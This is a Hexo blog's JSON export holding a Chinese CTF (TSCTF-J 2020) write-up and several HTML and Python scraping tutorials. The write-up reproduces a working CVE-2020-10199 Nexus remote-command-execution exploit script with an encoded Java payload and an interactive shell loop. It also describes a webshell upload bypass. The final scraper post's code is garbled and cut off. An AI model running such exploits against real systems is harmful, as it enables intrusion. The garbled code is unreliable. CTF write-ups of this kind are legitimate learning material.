{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"","slug":"2020tsctf-j","date":"2020-10-17T15:13:54.069Z","updated":"2020-10-19T14:42:30.078Z","comments":true,"path":"2020/10/17/2020tsctf-j/","link":"","permalink":"http://example.com/2020/10/17/2020tsctf-j/","excerpt":"2020tsctf-j部分writeupWeb部分","text":"2020tsctf-j部分writeupWeb部分 EasyF12第一步，删除disabled属性，可以解禁右标签的点击。进入下一层。 审计js代码，发现shuxing2()函数会刷新界面，而未被使用的shuxing()函数不会刷新界面 因此直接在控制台中进行命令for(var i =0, I&lt;10000, i++) shuxing() 瞬间即可将数值刷到要求。 另外也可以采用设置cookie的方法，直接将cookie中的“liliang”设置为10000。还可以用burp发包，在cookie内直接设置“liliang=10000” 之后是一个php校验md5绕过，发送get请求 第一个：v1=s878926199a&amp;&amp;v2=s155964671a的md5值相同 第二个：使用两个数组进行比较，即可利用php的严格判断漏洞 ZBR想要请客将网页下载至本地，修改js代码，使得每次答题成功会增加10000次总答题数，判断成功。 一起顶热评一开始尝试了burp爆破顶帖，不过效率太低，只刷到二十万就放弃了。 之后发现每注册一个账号就会拿到5000初始金额，恰好可以购买一次转发。 因此依次注册十多个账户，并为第一个热搜购买转发。刷到数量后打开对应路径。火狐内不能显现，因此复制到文本文档内，缩放大小，拿到flag 菜鸡的html注释内要求找到歌手的名字。打开外链再跳转到bilibili，把简介内的歌手名字都尝试一下，最后英文名为flag EzUpload上传文本文件，Burp抓包，将文件后缀名改为php，将内容改为一句话木马绕过。使用蚁剑连接，连接成功。 之后使用插件内的phpinfo功能，查看相关信息。可以得知使用了disable_function对命令进行了限制，并且限制了dir访问目录。在tmp内的php文件暗示了flag在根目录。因此使用蚁剑内的对应插件生成.antproxy.php，添加数据进行新的连接。连接成功，可以访问根目录。在根目录内找到flag.txt EzNexus获知Nexus版本为3.21.1，查阅可得存在cve-2020-10199漏洞和cve-2020-11444漏洞。由题目信息认为是使用keke账号越权修改chenvlqi密码。因此使用msf利用10199漏洞，只返回了session，没有拿到shell，不成功。可能是因为msf中的访问tmp命令并不能实现，所以脚本中止了。使用session调用11444的python脚本，修改目录中的admin为chenvlqi，仍然不成功。最后使用10199的python脚本以及keke账号登陆，登陆成功，并拿到了shell。之后命令行ls列出文件，发现flag.txt，cat flag.txt，读取到flag。 利用脚本如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#!/usr/bin/python3# -*- coding:utf-8 -*-# author:zhzyker# from:https://github.com/zhzyker/exphubimport sysimport requestsimport reimport base64if len(sys.argv)!=4: print(&#x27;+----------------------------------------------------------------------+&#x27;) print(&#x27;+ DES: by zhzyker as https://github.com/zhzyker/exphub +&#x27;) print(&#x27;+ CVE-2020-10199 Nexus 3 remote command execution +&#x27;) print(&#x27;+----------------------------------------------------------------------+&#x27;) print(&#x27;+ USE: python3 &lt;filename&gt; &lt;url&gt; &lt;username&gt; &lt;password&gt; +&#x27;) print(&#x27;+ EXP: python3 cve-2020-10199_cmd.py http://127.0.0.1:8081 admin admin +&#x27;) print(&#x27;+ VER: Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1 +&#x27;) print(&#x27;+----------------------------------------------------------------------+&#x27;) sys.exit()url = sys.argv[1]cmd = &quot;whoami&quot;username = sys.argv[2]password = sys.argv[3]base64_user = base64.b64encode(str.encode(username))user64 = base64_user.decode(&#x27;ascii&#x27;)base64_pass = base64.b64encode(str.encode(password))pass64 = base64_pass.decode(&#x27;ascii&#x27;)# get sessionidsession_url = url + &quot;/service/rapture/session&quot;session_data = &#123;&#x27;username&#x27;:user64,&#x27;password&#x27;:pass64&#125;session_headers = &#123; &#x27;Connection&#x27;: &quot;keep-alive&quot;, &#x27;Content-Length&#x27;: &quot;41&quot;, &#x27;X-Requested-With&#x27;: &quot;XMLHttpRequest&quot;, &#x27;X-Nexus-UI&#x27;: &quot;true&quot;, &#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;&#125;try: r = requests.post(session_url, data=session_data, headers=session_headers, timeout=20) session_str = str(r.headers) session = (re.search(r&quot;NXSESSIONID=(.*); Path&quot;, session_str).group(1)) print (&quot;[+] Get Sessionid: &quot; + session)except: print (&quot;[-] Not SessionID&quot;) sys.exit(0)# exec commanddef exp(cmd): cmd_url = url+ &quot;/service/rest/beta/repositories/go/group&quot; cmd_headrs = &#123; &#x27;Connection&#x27;: &quot;keep-alive&quot;, &#x27;NX-ANTI-CSRF-TOKEN&#x27;: &quot;0.6153568974227819&quot;, &#x27;Content-Length&#x27;: &quot;41&quot;, &#x27;X-Requested-With&#x27;: &quot;XMLHttpRequest&quot;, &#x27;X-Nexus-UI&#x27;: &quot;true&quot;, &#x27;Content-Type&#x27;: &quot;application/json&quot;, &#x27;404&#x27;: &quot;&quot;+cmd+&quot;&quot;, &#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &#x27;Cookie&#x27;: &quot;jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=&quot;+session+&quot;&quot; &#125; cmd_data = &quot;&quot;&quot; &#123; &quot;name&quot;: &quot;internal&quot;, &quot;online&quot;: true, &quot;storage&quot;: &#123; &quot;blobStoreName&quot;: &quot;default&quot;, &quot;strictContentTypeValidation&quot;: true &#125;, &quot;group&quot;: &#123; &quot;memberNames&quot;: [&quot;$&#123;&#x27; &#x27;.getClass().forName(&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;).newInstance().loadClass(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A&#x27;).newInstance()&#125;&quot;] &#125; &#125; &quot;&quot;&quot; try: r = requests.post(url=cmd_url, data=cmd_data, headers=cmd_headrs, timeout=20) print (r.text) except: print (&quot;[-] Target Not Vuln Good Luck!!!&quot;) sys.exit(0)while 1: cmd = input(&quot;Shell &gt;&gt;&gt; &quot;) if cmd == &quot;exit&quot; : exit(0) exp(cmd) Misc笑里藏刀压缩文件，爆破就行了。最后是一个base64编码 隐写术知多少每行都有一个数对，并且列坐标是连续的，因此直接推测这是以坐标的形式存储了一张图片。使用python脚本进行读取打印，发现一个少了两个定位符的二维码，补齐之后扫描，拿到flag 脚本如下 See ass go二百多mb的文件，推测是视频。拖到kali中果然显示是视频文件。 更改后缀为mov，mpeg Mpeg可以打开。打开后为一段csgo游戏视频。使用quicktimeplayer逐帧查看，发现在闪光弹帧存在一个二维码。扫描后拿到flag 俄罗斯套娃先进行暴力破解，发现初始密码为0000，存在递增规律。因此生成四位数字典，使用extracton递回解压。 刚开始可能会出现压缩包损坏，手动解压几次绕过去就可以了。 hide&amp;seek由Stegslove解析可知这既是一个png文件，也是一个doc文件。在winhex中搜索图片高度的十六进制，增大高度后可以拿到第一部分的flag，之后打开doc文件，取消隐藏文字。上半部分为佛曰密码，下半部分为社会主义核心价值观密码，解密后拿到第二部分flag whoamibinwalk拿到压缩包，winhex打开，末尾为压缩包密码。得到一个JSFUCK编码，删除最后的一对括号，在控制台运行，得到乱序的flag。用15位栅栏密码得到flag meizi-again将mp4逐帧拆分，再利用montage合并为35x35的图片，组成一个迷宫 左半部分被封锁，不能走通，最后得到方向 rlrrllrrlllrrrlllrrlllrllrrlrlrrrlrllrrlrlrlllrrllrr 加密得到flag ReverseEasyXor直接拖到ida中，打开main函数f5，发现一个异或运算。由异或运算的性质，两次运算后得到本身，所以编写程序再进行一次异或运算，得到flag 程序如下 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;int main(void) &#123; int n[29]; char decode[29] = &quot;abcdefghijklmnopqrstuvwxyz!!!&quot;; n[0] = 62; n[1] = 58; n[2] = 41; n[3] = 57; n[4] = 44; n[5] = 84; n[6] = 54; n[7] = 28; n[8] = 58; n[9] = 99; n[10] = 34; n[11] = 60; n[12] = 98; n[13] = 9; n[14] = 20; n[15] = 56; n[16] = 78; n[17] = 31; n[18] = 32; n[19] = 52; n[20] = 74; n[21] = 13; n[22] = 27; n[23] = 48; n[24] = 37; n[25] = 36; n[26] = 29; n[27] = 97; n[28] = 101; for(int i=0;i&lt;=28;i++) &#123;n[i]=(n[i]-9)^decode[i]; printf(&quot;%c&quot;,(char)n[i]);&#125; return 0;&#125; CryptoLordRiots student首先用yafu对进行质因数分解，之后的RSA很简单。 三十六天罡+72地煞先将人名转换为在天罡地煞中的排名，之后每个排名都加72，对照ascii表得出flag 二重唱文本中混杂了摩斯电码和中文电码。摩斯电码缺少/，所以可以逐个比对。中文电码直接在网站翻译。揭秘后为一个求椭圆加密公钥的问题。利用软件直接得解。然后将x与y相加，拿到flag checkin一个搜索歌词消磨这一生 另一个关注天璇公众号","categories":[],"tags":[]},{"title":"html-2","slug":"html-2","date":"2020-09-17T12:21:45.000Z","updated":"2020-09-27T14:41:19.550Z","comments":true,"path":"2020/09/17/html-2/","link":"","permalink":"http://example.com/2020/09/17/html-2/","excerpt":"","text":"","categories":[],"tags":[{"name":"PHP相关","slug":"PHP相关","permalink":"http://example.com/tags/PHP%E7%9B%B8%E5%85%B3/"}]},{"title":"HTML 预备知识及webstorm快捷键","slug":"html-1","date":"2020-09-13T13:51:53.000Z","updated":"2020-09-27T14:40:48.432Z","comments":true,"path":"2020/09/13/html-1/","link":"","permalink":"http://example.com/2020/09/13/html-1/","excerpt":"HTML，即超文本标记语言或超文本标签语言。","text":"HTML，即超文本标记语言或超文本标签语言。 一个网页文件包含头部分(head)和主题部分(body) 增强的文本编辑器：比较有名的编辑器有dreamweaver,sbulime,webstorm webstorm快捷键编辑 Command+alt+T 用 (if..else, try..catch, for, etc.)包住Command+/ 注释/取消注释的行注释Command+alt+/ 注释/取消注释与块注释alt+↑ 向上选取代码块alt+↓ 向下选取代码块Command+alt+L 格式化代码tab,shift+tab 调整缩进Control+alt+I 快速调整缩进Command+C 复制Command+X 剪切Command+V 粘贴Command+shift+V 从剪贴板里选择粘贴Command+D 复制代码副本Command+delete 删除当前行Control+Shift+J 清除缩进变成单行shift+回车 快速换行Command+回车 换行光标还在原先位置Command+shift+U 大小写转换Command+shift+[,Command+shift+] 文件选项卡快速切换Command+加号,Command+减号 收缩代码块Command+shift+加号，Command+shift+减号 收缩整个文档的代码块Command+W 关闭当前文件选项卡alt+单击 光标在多处定位Control+shift+J 把下面行的缩进收上来shift + F6 高级修改，可快速修改光标所在的标签、变量、函数等alt+/ 代码补全Control+G 选中相同的代码块，可同时编辑 调试 Control+alt+R 运行项目Command+Control+R 运行DebugCommand+F8 添加断点Command+shift+F8 打开断点列表 导航 Command+O 跳转到某个类Command+shift+O 跳转到某个文件Command+alt+O 跳转到某个符号Control+←,Control+→ 转到上/下一个编辑器选项卡F12 打开之前打开的工具窗口（TODO、终端等）Command+L 跳转行Command+E 弹出最近文件Command+alt+←,Command+alt+→ 向前向后导航到代码块交接处（一般是空行处）Command+shift+delete 导航到上一个编辑位置的位置Command+B 跳转到变量声明处Control+J 获取变量相关信息（类型、注释等，注释是拿上一行的注释）Command+Y 小浮窗显示变量声明时的行Command+[,Command+] 光标现在的位置和之前的位置切换Command+F12 文件结构弹出式菜单alt+H 类的层次结构F2,shift+F2 切换到上\\下一个突出错误的位置Command+↑ 跳转到导航栏F3 添加书签alt+F3 添加带助记的书签alt+1,alt+2… 切换到相应助记的书签位置Command+F3 打开书签列表 VCS/本地历史记录 control+V 打开VST小浮窗Command+K 提交项目Command+T 更新项目alt+shift+C 打开最近修改列表 搜索和替换 Command+F 搜索Command+R 替换Command+G 查找下一个Command+shift+G 查找下一个Command+shift+F 按路径搜索Command+shift+R 按路径替换 选中文字的搜索 Command+F7 向声明的地方搜索并选中Command+shift+F7 打开搜索框进行搜索Command+alt+F7 打开小浮窗显示搜索列表 对项目文件的操作（重构） F5 复制文件到某个目录F6 移动文件到某个目录Command+delete 安全删除shift+F6 重命名 全局的 双击shift 弹出小浮窗搜索所有Command+切换项目 Command+shift+ 反向切换项目Command+shift+A 整个工程的查找操作Command+1,Command+2… 打开各种工具窗口alt+shift+F 把文件添加到收藏夹alt+shift+I 打开项目描述alt+~ 快速切换当前计划Command+, 设置编辑器Control+Tab 选项卡和工具窗口之间进行切换alert+回车 显示npm版本升级列表","categories":[],"tags":[{"name":"PHP相关","slug":"PHP相关","permalink":"http://example.com/tags/PHP%E7%9B%B8%E5%85%B3/"}]},{"title":"python spider之 微博热搜实战","slug":"python-6","date":"2020-09-12T15:44:49.000Z","updated":"2020-09-20T12:14:08.877Z","comments":true,"path":"2020/09/12/python-6/","link":"","permalink":"http://example.com/2020/09/12/python-6/","excerpt":"每3s爬取微博热搜并写入xlsx文件","text":"每3s爬取微博热搜并写入xlsx文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111import datetimeimport timefrom _csv import writerimport xlsxwriterimport requestsfrom lxml import etreeheaders = &#123; &#x27;User-Agent&#x27;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot; ,&#x27;Cookie&#x27;:&#x27;#这个填自己的&#x27;&#125;url = &#x27;https://s.weibo.com/top/summary?cate=realtimehot&#x27;def func(headers,url):# 1.将目标网站上的页面抓抓取下来 response = requests.get(url,headers=headers) text = response.text # 2.将抓取下来的网页根据一定的规则进行提取 html=etree.HTML(text) pl = html.xpath(&quot;//div[@class=&#x27;data&#x27;]//a/text()&quot;) hot = html.xpath(&quot;//div[@class=&#x27;data&#x27;]//span/text()&quot;) #for i in range(50): # print(pl[i],hot[i]) dic = dict(map(lambda x,y:[x,y],pl,hot)) #print(dic) #s = str(dic) #f = open(&#x27;dict.xlsx&#x27;,&#x27;w&#x27;) #f.writelines(s) #f.close() return dicdef export_excel(dic): s = str(dic) f = open(&#x27;dict1.json&#x27;,&#x27;w&#x27;,newline=&#x27;&#x27;) f.writelines(s) f.close()def trans(key): f = open(&#x27;file.csv&#x27;,&#x27;a&#x27;,newline=&#x27;&#x27;) w = writer(f) w.writerow(dict(key))# 生成excel文件def generate_excel(expenses,name): workbook = xlsxwriter.Workbook(name) worksheet = workbook.add_worksheet() # 设定格式，等号左边格式名称自定义，字典中格式为指定选项 # bold：加粗，num_format:数字格式 bold_format = workbook.add_format(&#123;&#x27;bold&#x27;: True&#125;) # money_format = workbook.add_format(&#123;&#x27;num_format&#x27;: &#x27;$#,##0&#x27;&#125;) # date_format = workbook.add_format(&#123;&#x27;num_format&#x27;: &#x27;mmmm d yyyy&#x27;&#125;) # 将二行二列设置宽度为15(从0开始) worksheet.set_column(1, 1, 15) # 用符号标记位置，例如：A列1行 worksheet.write(&#x27;A1&#x27;, &#x27;sku_id&#x27;, bold_format) worksheet.write(&#x27;A2&#x27;, &#x27;sku_title&#x27;, bold_format) worksheet.write(&#x27;A3&#x27;, &#x27;id_2&#x27;, bold_format) row = 0 col = 0 for key , values in expenses.items(): # 使用write_string方法，指定数据格式写入数据 key = str(key) values = str(values) worksheet.write_string(row, col, key) worksheet.write_string(row, col +1, values) row += 1 workbook.close()def creater(num): # 将分析完成的列表导出为excel表格 dic = func(headers, url) name = &#x27;data&#x27; + str(num) + &#x27;.xlsx&#x27; generate_excel(dic, name)if __name__ == &#x27;__main__&#x27;: flag = 0 num = 306 now = datetime.datetime.now() sched_time = datetime.datetime(now.year, now.month, now.day, now.hour, now.minute, now.second) + \\ datetime.timedelta(seconds=3) while True: now = datetime.datetime.now() if sched_time &lt; now: time.sleep(3) print(now) creater(num) num += 1 flag = 1 else: if flag == 1: sched_time = sched_time + datetime.timedelta(minutes=2) flag = 0","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python spider之 BeautifulSoup4库","slug":"python-5","date":"2020-09-11T09:06:57.000Z","updated":"2020-09-20T12:13:56.742Z","comments":true,"path":"2020/09/11/python-5/","link":"","permalink":"http://example.com/2020/09/11/python-5/","excerpt":"性能低于lxml，但是更加人性化，使用最简单","text":"性能低于lxml，但是更加人性化，使用最简单 find()和find_all()方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from bs4 import BeautifulSouphtml = &#x27;&#x27;soup = BeautifulSoup(html,&#x27;lxml&#x27;)# 1.获取所有tr标签trs = soup.find_all(&#x27;tr&#x27;)for tr in trs: print(tr)# 2.获取第二个tr标签tr = soup.find_all(&#x27;tr&#x27;,limit=2)[1]print(tr)# 3.获取所有class等于even的tr标签#trs = soup.find_all(&#x27;tr&#x27;,class_=&#x27;even&#x27;)trs = soup.find_all(&#x27;tr&#x27;,attrs=&#123;&#x27;class&#x27;:&#x27;even&#x27;&#125;)for tr in trs: print(tr)# 4.所有id=test且class=test的a标签提取出来aList = soup.find_all(&#x27;a&#x27;,id=&#x27;test&#x27;,&#x27;class&#x27;=&#x27;test&#x27;)for a in aList: print(a)# 5.获取所有a标签的href属性aList = soup.find_all(&#x27;a&#x27;)for a in aList: #第一种 href = a[&#x27;href&#x27;] print(href) #第二种 #href = a.attrs[&#x27;href&#x27;] #print(href)# 6.获取所有的职位信息（纯文本）trs = soup.find_all(&#x27;tr&#x27;)[1:]movies = []for tr in trs: movie = &#123;&#125; #下方替换的部分 tds =tr.find_all(&#x27;td&#x27;) title = tds[0].string category = tds[1].string nums = tds[2].string city = tds[3].string pubtime = tds[4].string movie[&#x27;title&#x27;] = title movie[&#x27;category&#x27;] = category movie[&#x27;nums&#x27;] = nums movie[&#x27;city&#x27;] = city movie[&#x27;pubtime&#x27;] = pubtime movies.append(movie)print(movies) #也可以采用这样的方法 infos = list(tr.string) #infos = list(tr.stripped_strings) #movie[&#x27;title&#x27;] = infos[0] #movie[&#x27;category&#x27;] = infos[1] #movie[&#x27;nums&#x27;] = infos[2] #movie[&#x27;city&#x27;] = infos[3] #movie[&#x27;pubtime&#x27;] = infos[4] #movies.append(movie) #print(movies) CSS选择器select方法","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python spider之 实战1","slug":"python-4","date":"2020-09-11T04:45:41.000Z","updated":"2020-09-20T12:13:41.753Z","comments":true,"path":"2020/09/11/python-4/","link":"","permalink":"http://example.com/2020/09/11/python-4/","excerpt":"豆瓣电影爬虫","text":"豆瓣电影爬虫 123456789101112131415161718192021import requestsfrom lxml import etree# 1.将目标网站上的页面上抓取下来headers = &#123; &#x27;User-Agent&#x27;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot; ,&#x27;Refer&#x27;:&#x27;https://beijing.douban.com/&#x27;&#125;url = &#x27;https://beijing.douban.com/&#x27;response = requests.get(url,headers=headers)text = response.text #删去文本中存在的换行符text = text.replace(&quot;\\n&quot;,&quot;&quot;)# 2.将抓取下来的网页根据一定的规则进行提取html=etree.HTML(text) #返回的是一个列表ul = html.xpath(&quot;//ul[@class=&#x27;events-list events-list-2col events-list-pic75&#x27;]//div[@class=&#x27;info&#x27;]/div/a/text()&quot;)for i in ul: #删除两端空格 print(i.strip()) 电影天堂爬虫爬取详情页12345678910111213141516171819202122from lxml import etreeimport requestsurl=&#x27;https://www.dytt5.net/dy/index.html&#x27;headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36&quot; , &quot;Refer&quot;:&quot;https://www.dytt5.net/dy/&quot;&#125;response = requests.get(url,headers=headers)text = response.content.decode(&#x27;utf-8&#x27;)html = etree.HTML(text)#电影标题titles = html.xpath(&quot;//ul[@class=&#x27;fly-case-list&#x27;]/li/h3/a/text()&quot;)#详细页链接urls = html.xpath(&quot;//ul[@class=&#x27;fly-case-list&#x27;]/li/h3//a/@href&quot;)for i in urls: print(i)for i in titles: print(i) 爬虫完成1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586def get detail urls (url) :response = requests.get(url,headers = HEADERS)#response.text# response.content# requests库，默认会使用自己猜测的编码方式将#抓取下来的网页进行解码，然后存储到text属性上去#在电影天堂的网页中,因为编码方式,requests库猜错了。所以就会产生乱码text = response . content . decode ( &#x27;utf-8&#x27; )html = etree.HTML(text)detail_urls = html.xpath(&quot;//table[@class=&#x27; tbspan&#x27;]//a/@href&quot;)detail_ urls = map(lambda url:BASE_DOMAIN+url,detail_urls)return detail_urlsdef parse detail_ page (url) :movie =&#123;&#125;response = requests .get(url, headers= HEADERS)text = response.content.decode ( &#x27;utf-8&#x27; )html = etree.HTML(text)title = htm1 .xpath(&quot;//div[@class=&#x27;title _all&#x27;]//font [@color&#x27; #07519a&#x27;]/text()&quot;)[0]movie[&#x27;title&#x27;] = titlezoomE = html . xpath(&quot;//div[@id=&#x27;Zoom&#x27;]&quot;)[0]imgs = zoomE . xpath(&quot;.//img/@sra&quot;)cover = 